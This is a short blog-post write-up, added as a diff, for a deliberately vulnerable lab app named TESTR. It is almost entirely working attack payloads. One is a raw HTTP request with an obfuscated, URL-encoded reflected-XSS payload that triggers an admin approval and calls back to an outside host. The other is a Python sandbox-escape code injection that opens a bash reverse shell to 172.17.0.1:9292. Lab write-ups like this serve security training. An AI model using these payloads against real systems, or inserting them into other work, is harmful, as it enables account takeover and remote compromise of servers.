@@ -1,0 +1,39 @@
+---
+layout: post
+title:  "Writeup TESTR"
+date:   2022-11-08 13:12:00 +0900
+categories: security
+---
+
+# TESTR
+[https://github.com/bmdyy/testr](https://github.com/bmdyy/testr)
+
+# Summary
+- templates/api.html
+    - Reflected XSS
+    - /apply
+- app.py /editor
+    - after auth bypass
+    - Code Injection
+
+# XSS
+
+POST /apply HTTP/1.1
+Host: 172.17.0.2:5000
+Content-Length: 887
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://172.17.0.2:5000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://172.17.0.2:5000/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+name=wtc2&email=wtc2%40com&website=/api?q=%25%33%63%69%66%72%61%6d%65%25%32%30%73%72%63%25%33%64%25%32%32%25%32%36%25%32%33%78%36%61%25%33%62%61%76%61%73%63%72%69%70%74%25%33%61%63%6f%6e%73%74%25%32%30%66%25%32%30%25%33%64%25%32%30%6e%65%77%25%32%30%46%6f%72%6d%44%61%74%61%28%29%25%33%62%66%2e%61%70%70%65%6e%64%28%27%65%6d%61%69%6c%27%25%32%63%25%32%30%27%77%74%63%32%25%34%30%63%6f%6d%27%29%25%33%62%66%65%74%63%68%28%27%25%32%66%61%70%70%72%6f%76%65%27%25%32%63%25%37%62%6d%65%74%68%6f%64%25%33%61%25%32%30%27%50%4f%53%54%27%25%32%63%62%6f%64%79%25%33%61%25%32%30%66%25%37%64%29%2e%74%68%65%6e%28%72%65%73%25%32%30%25%33%64%25%33%65%25%32%30%25%37%62%66%65%74%63%68%28%27%68%74%74%70%25%33%61%25%32%66%25%32%66%31%37%32%2e%31%37%2e%30%2e%31%25%32%66%61%70%70%72%6f%76%65%5f%73%75%63%63%65%73%73%32%27%29%25%37%64%29%25%32%32%25%33%65&secret_phrase=secret&password=oswe&password2=oswe
+
+## RCE
+
+print(''.__class__.__mro__[-1].__subclasses__()[393]("bash -c 'bash -i >& /dev/tcp/172.17.0.1/9292 0>&1'", shell=True))
